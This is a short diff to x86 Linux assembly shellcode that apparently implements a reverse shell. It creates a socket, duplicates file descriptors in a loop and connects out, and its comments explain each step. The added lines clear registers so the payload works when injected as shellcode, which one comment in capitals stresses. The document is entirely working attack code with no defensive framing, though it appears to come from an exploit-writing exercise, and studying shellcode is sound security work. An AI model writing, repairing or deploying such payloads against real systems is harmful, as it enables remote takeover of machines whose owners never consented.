@@ -10,6 +10,7 @@ _start:
     xor ecx, ecx ; clear out ecx
     mov ecx, esp ; move our arg values into ecx (place a pointer to these values with an address stored in ecx)
     mov al, 102   ; we move the socketcall syscall value into al, to avoid padding
+    xor ebx, ebx  ; SHELLCODE DID NOT WORK WITHOUT THIS HERE, IT WILL WORK WITH NASM BUT NOT AS SHELLCODE DUE TO REGISTER NOISE!!!
     mov bl, 1     ; we set function to 1, which is the value of socket
     int 0x80 ; call system interrupt 
     mov esi, eax ; we store the returning value of our syscall for later use in other functions
@@ -19,6 +20,7 @@ _start:
     xor ecx,ecx
 
 loop:
+    xor eax, eax
     mov al, 63
     int 0x80 ; call DUP
     inc ecx ; increase by 1
@@ -37,6 +39,7 @@ loop:
     push ecx ; push our created structure on as second arg
     push esi ; push created socket fd on as first arg
     mov ecx, esp ; move our values into ecx for the syscall
+    xor ebx, ebx
     mov bl, 3 ; we set function to 3, which is the value of connect
     xor eax, eax
     mov al, 102
